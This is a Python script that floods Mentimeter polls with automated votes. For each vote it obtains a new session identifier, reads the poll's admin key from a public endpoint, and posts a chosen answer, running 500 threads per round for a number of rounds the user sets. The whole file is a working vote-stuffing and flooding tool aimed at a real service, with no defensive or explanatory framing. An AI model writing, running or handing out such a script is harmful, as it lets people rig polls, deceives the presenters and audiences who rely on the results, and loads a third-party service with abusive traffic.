#!/usr/bin/python
import requests
import sys
import threading
import json

threadys = []


def doRequest(code, type, ans):
    session = requests.Session()
    cookie = session.post('https://www.menti.com/core/identifier', data={})

    response = session.get(('https://www.menti.com/core/objects/vote_ids/' + code),
                           cookies={'identifier1': cookie.json()["identifier"]})

    data = response.json()


    admin = data['questions'][0]['admin_key']

    out = session.post("https://www.menti.com/core/vote/" + admin, json={"type": type, "vote": ans},
                       cookies={'identifier1': cookie.json()["identifier"]},
                       headers={'X-Identifier': cookie.json()["identifier"]})

    print(out)


def main():
    code = sys.argv[1]
    type = sys.argv[2]
    ans = sys.argv[3]
    num = sys.argv[4]

    for i in range(0, int(num)):
        for t in range(0, 500):
            thread = threading.Thread(target=doRequest, args=(code, type, ans))
            threadys.append(thread)
            thread.start()
        for thread1 in threadys:
            thread1.join()

    return 1


main()
